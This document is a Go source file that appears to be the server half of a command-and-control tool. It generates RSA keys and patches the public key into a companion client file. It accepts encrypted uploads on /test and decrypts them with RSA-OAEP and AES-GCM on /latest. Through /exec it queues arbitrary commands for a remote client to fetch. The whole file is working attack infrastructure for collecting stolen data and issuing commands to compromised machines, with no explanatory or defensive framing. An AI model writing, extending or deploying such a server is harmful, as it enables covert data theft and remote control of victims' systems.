package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/base64"
	"encoding/pem"
	"flag"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"strings"
	"sync"
)

var (
	lastRequestBody []byte
	pendingCommands []string
	mu              sync.Mutex
	privkey         string
)

func generateKeys() error {
	privateKey, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return fmt.Errorf("[+] failed to generate private key: %w", err)
	}

	privateKeyPEM := &pem.Block{
		Type:  "RSA PRIVATE KEY",
		Bytes: x509.MarshalPKCS1PrivateKey(privateKey),
	}

	privateKeyFile, err := os.Create("private_key.pem")
	if err != nil {
		return fmt.Errorf("[+] failed to create private key file: %w", err)
	}
	defer privateKeyFile.Close()

	if err := pem.Encode(privateKeyFile, privateKeyPEM); err != nil {
		return fmt.Errorf("[+] failed to encode private key: %w", err)
	}

	publicKeyDER, err := x509.MarshalPKIXPublicKey(&privateKey.PublicKey)
	if err != nil {
		return fmt.Errorf("[+] failed to marshal public key: %w", err)
	}

	publicKeyPEM := &pem.Block{
		Type:  "PUBLIC KEY",
		Bytes: publicKeyDER,
	}

	var publicKeyBuf bytes.Buffer
	if err := pem.Encode(&publicKeyBuf, publicKeyPEM); err != nil {
		return fmt.Errorf("[+] failed to encode public key: %w", err)
	}

	if err := updateMainGoWithPublicKey(publicKeyBuf.String()); err != nil {
		return fmt.Errorf("[+] failed to update main.go: %w", err)
	}

	fmt.Println("[+] RSA key pair generated successfully")
	fmt.Println("[+] private key saved to private_key.pem")
	fmt.Println("[+] public key written to cmd/main.go")
	
	return nil
}

func loadPrivateKey() error {
	data, err := os.ReadFile("private_key.pem")
	if err != nil {
		return fmt.Errorf("[+] failed to read private key file: %w", err)
	}
	privkey = string(data)
	return nil
}

func updateMainGoWithPublicKey(publicKey string) error {
	content, err := os.ReadFile("../cmd/main.go")
	if err != nil {
		return fmt.Errorf("[+] failed to read main.go: %w", err)
	}

	contentStr := string(content)
	
	oldPattern := "const pubkey string = `"
	newPattern := "const pubkey string = `" + publicKey + "`"
	
	if strings.Contains(contentStr, "var pubkey string") {
		contentStr = strings.Replace(contentStr, "var pubkey string", newPattern, 1)
	} else if strings.Contains(contentStr, oldPattern) {
		start := strings.Index(contentStr, oldPattern)
		if start == -1 {
			return fmt.Errorf("[+] could not find pubkey declaration")
		}
		end := strings.Index(contentStr[start+len(oldPattern):], "`")
		if end == -1 {
			return fmt.Errorf("[+] could not find end of pubkey declaration")
		}
		end += start + len(oldPattern) + 1
		contentStr = contentStr[:start] + newPattern + contentStr[end:]
	} else {
		return fmt.Errorf("[+] could not find pubkey declaration")
	}

	if err := os.WriteFile("../cmd/main.go", []byte(contentStr), 0644); err != nil {
		return fmt.Errorf("[+] failed to write main.go: %w", err)
	}

	return nil
}

func handleTest(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "[+] only POST supported", http.StatusMethodNotAllowed)
		return
	}

	body, err := io.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "[+] failed to read body", http.StatusBadRequest)
		return
	}
	defer r.Body.Close()

	mu.Lock()
	lastRequestBody = body
	mu.Unlock()

	fmt.Fprintln(w, "[+] OK")
}

func handleLatest(w http.ResponseWriter, r *http.Request) {
	mu.Lock()
	defer mu.Unlock()

	if len(lastRequestBody) == 0 {
		http.Error(w, "[+] no data received yet", http.StatusNotFound)
		return
	}

	decodedPayload, err := base64.StdEncoding.DecodeString(string(lastRequestBody))
	if err != nil {
		http.Error(w, fmt.Sprintf("[+] base64 decode error: %v", err), http.StatusBadRequest)
		return
	}

	if len(decodedPayload) <= 256 {
		http.Error(w, "[+] malformed payload", http.StatusBadRequest)
		return
	}

	ciphertext := decodedPayload[:len(decodedPayload)-256]
	encKey := decodedPayload[len(decodedPayload)-256:]

	aesKey, err := decryptKeyWithRSA(privkey, encKey)
	if err != nil {
		http.Error(w, fmt.Sprintf("[+] RSA decrypt error: %v", err), http.StatusInternalServerError)
		return
	}

	plaintext, err := decryptAESGCM(ciphertext, aesKey)
	if err != nil {
		http.Error(w, fmt.Sprintf("[+] AES-GCM decrypt error: %v", err), http.StatusInternalServerError)
		return
	}

	w.Write(plaintext)
}

func handleExec(w http.ResponseWriter, r *http.Request) {
	mu.Lock()
	defer mu.Unlock()

	switch r.Method {
	case http.MethodPost:

		body, err := io.ReadAll(r.Body)
		if err != nil {
			http.Error(w, "[+] failed to read body", http.StatusBadRequest)
			return
		}
		defer r.Body.Close()

		command := string(body)
		pendingCommands = append(pendingCommands, command)

		fmt.Fprintln(w, "[+] command queued")

	case http.MethodGet:

		if len(pendingCommands) == 0 {
			http.Error(w, "[+] no commands pending", http.StatusNotFound)
			return
		}

		command := pendingCommands[0]
		pendingCommands = pendingCommands[1:]

		fmt.Fprintln(w, command)

	default:
		http.Error(w, "[+] method not allowed", http.StatusMethodNotAllowed)
	}
}

func main() {
	genFlag := flag.Bool("gen", false, "Generate RSA key pair")
	flag.Parse()

	if *genFlag {
		if err := generateKeys(); err != nil {
			log.Fatalf("[+] failed to generate keys: %v", err)
		}
		return
	}

	if err := loadPrivateKey(); err != nil {
		log.Fatalf("[+] failed to load private key: %v", err)
	}

	http.HandleFunc("/test", handleTest)
	http.HandleFunc("/latest", handleLatest)
	http.HandleFunc("/exec", handleExec)

	fmt.Println("[+] listening on http://localhost:8080 ...")
	log.Fatal(http.ListenAndServe(":8080", nil))
}

func decryptKeyWithRSA(privPEM string, encKey []byte) ([]byte, error) {
	block, _ := pem.Decode([]byte(privPEM))
	if block == nil {
		return nil, fmt.Errorf("[+] failed to decode private key PEM")
	}

	priv, err := x509.ParsePKCS1PrivateKey(block.Bytes)
	if err != nil {
		return nil, fmt.Errorf("[+] failed to parse private key: %w", err)
	}

	key, err := rsa.DecryptOAEP(sha256.New(), rand.Reader, priv, encKey, nil)
	if err != nil {
		return nil, fmt.Errorf("[+] RSA decryption failed: %w", err)
	}

	return key, nil
}
func decryptAESGCM(ciphertext []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, fmt.Errorf("[+] failed to init AES cipher: %w", err)
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, fmt.Errorf("[+] failed to init GCM: %w", err)
	}

	nonceSize := gcm.NonceSize()
	if len(ciphertext) < nonceSize {
		return nil, fmt.Errorf("[+] ciphertext too short")
	}

	nonce := ciphertext[:nonceSize]
	enc := ciphertext[nonceSize:]

	plain, err := gcm.Open(nil, nonce, enc, nil)
	if err != nil {
		return nil, fmt.Errorf("[+] failed to decrypt: %w", err)
	}

	return plain, nil
}


